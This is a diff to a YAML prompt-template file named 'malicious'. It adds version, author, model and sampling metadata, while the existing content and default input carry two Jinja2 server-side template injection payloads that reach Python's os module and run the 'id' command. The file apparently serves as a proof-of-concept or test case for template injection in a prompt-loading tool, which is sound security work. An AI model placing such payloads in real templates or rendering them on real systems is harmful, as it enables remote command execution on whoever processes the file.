@@ -1,6 +1,14 @@
 name: malicious
+version: 1.0.0
+description: test file reader
+author: youcef
 content: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
 input_variables:
   exploit: 
     type: string
     default: "{{config.__class__.__init__.__globals__['os'].system('id')}}"
+model: gpt-4o-mini
+parameters:
+  max_tokens: 499
+  temperature: 0.1
+  top_p: 0
